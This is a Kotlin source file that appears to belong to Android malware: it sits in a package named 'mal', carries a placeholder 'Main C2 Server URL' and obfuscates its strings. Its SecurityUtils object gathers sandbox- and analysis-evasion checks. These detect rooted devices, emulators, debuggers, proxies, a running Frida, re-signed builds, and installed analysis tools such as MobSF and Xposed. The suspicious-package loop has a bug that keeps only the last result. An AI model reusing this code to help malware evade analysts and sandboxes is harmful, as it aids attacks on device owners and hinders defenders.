package com.mobilesec.govcomm.mal

import android.os.Build
import io.github.c0nnor263.obfustringcore.ObfustringThis
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.File
import android.content.Context
import android.content.pm.PackageManager
import android.util.Base64
import android.util.Log
import java.security.MessageDigest
import java.security.NoSuchAlgorithmException

@ObfustringThis
object SecurityUtils {
    // Main C2 Server URL

    val c2ServerUrl = "YOUR_C2_SERVER_URL"

    fun isDeviceRooted(): Boolean {
        val deviceRooted = checkRootMethod1() || checkRootMethod2() || checkRootMethod3()
        //Log.d("isDeviceRooted", deviceRooted.toString())
        return deviceRooted
    }
    fun isFridaRunning(): Boolean = checkFridaMethod()
    fun isNotRealDevice(context: Context): Boolean {
        val deviceLOL = isDeviceRooted() || isDebuggable() || isEmulator() || isFridaRunning() || hasSuspiciousPackages(context) || checkMaliciousSignature(context)
        //val deviceLOL = checkMaliciousSignature(context)
        //Log.d("isNotRealDevice", deviceLOL.toString())
        return deviceLOL
    }

    private fun checkRootMethod1(): Boolean {
        // Implementation
        val buildTags = android.os.Build.TAGS
        return buildTags != null && buildTags.contains("test-keys")
    }
    @Throws(PackageManager.NameNotFoundException::class, NoSuchAlgorithmException::class)
    private fun checkMaliciousSignature(context: Context): Boolean {
        val devSignature = "YOUR_DEV_SIGNATURE"
        val pm = context.packageManager
        val packageInfo = pm.getPackageInfo(context.packageName, PackageManager.GET_SIGNING_CERTIFICATES)
        val signatures = packageInfo.signingInfo.apkContentsSigners
        for (signature in signatures) {
            val signatureBytes = signature.toByteArray()
            val md = MessageDigest.getInstance("SHA")
            md.update(signatureBytes)
            val currentSignature = Base64.encodeToString(md.digest(), Base64.NO_WRAP)
            //Log.d("current Signature", currentSignature)
            //Log.d("dev Signature", devSignature)
            // supposed to be currentSignature == devSignature
            if (currentSignature.toString() == devSignature) {
                Log.d("is Signature", "Signature are matching!")
                return false
            }
        }
        //Log.d("is Signature", "Signature are not matching!")
        return true
    }

    private fun checkRootMethod2(): Boolean {
        // Implementation
        val paths = arrayOf(
            "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su",
            "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su",
            "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su"
        )
        val checkMethod2 = paths.any { File(it).exists() }
        //Log.d("is Root method 2", checkMethod2.toString())
        return checkMethod2
    }

    private fun checkRootMethod3(): Boolean {
        var process: Process? = null
        return try {
            process = Runtime.getRuntime().exec(arrayOf("/system/xbin/which", "su"))
            BufferedReader(InputStreamReader(process.inputStream)).readLine() != null
        } catch (t: Throwable) {
            false
        } finally {
            process?.destroy()
        }
    }

    private fun checkFridaMethod(): Boolean {
        val fridaProcesses = listOf("frida-server", "frida-agent")
        var isRunning = false

        try {
            val runningProcesses = Runtime.getRuntime().exec("ps").inputStream.bufferedReader().useLines {
                lines -> lines.toList()
            }

            isRunning = fridaProcesses.any {
                processName -> runningProcesses.any {
                    line -> line.contains(processName)
            }

            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        //Log.d("is frida running", isRunning.toString())
        return isRunning
    }

    private fun isDebuggable(): Boolean {
        val vmDebug = System.getProperty("java.vm.debug")
        if (vmDebug != null) {
            //Log.d("Debuggable", "true")
        }else {
            //Log.d("Debuggable", "false")
        }
        return "true".equals(vmDebug, ignoreCase = true)
    }

    private fun mightBeUsingProxy(): Boolean {
        val proxyHost = System.getProperty("http.proxyHost")
        val proxyPort = System.getProperty("http.proxyPort")
        val socksProxyHost = System.getProperty("socksProxyHost")
        val socksProxyPort = System.getProperty("socksProxyPort")
        val checkproxy = !proxyHost.isNullOrEmpty() || !proxyPort.isNullOrEmpty() || !socksProxyHost.isNullOrEmpty() || !socksProxyPort.isNullOrEmpty()
        return checkproxy
    }

    fun hasSuspiciousPackages(context: Context): Boolean {
        val packages = listOf("de.robv.android.xposed.installer", "com.saurik.substrate", "com.mobsf.MobSF_VM", "com.mobsf.Dynamic_Analyzer")
        val pm = context.packageManager
        var checksus = false
        packages.forEach {packageName ->
            try {
                pm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES)
                checksus = true
            } catch (e: PackageManager.NameNotFoundException) {
                checksus = false
            }
        }
        //Log.d("is Sus Package", checksus.toString())
        return checksus
    }

    fun isEmulator(): Boolean {
        // Implementation
        val checkEmulator = (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk" == Build.PRODUCT
        //Log.d("is Emulator", checkEmulator.toString())
        return checkEmulator
    }
}
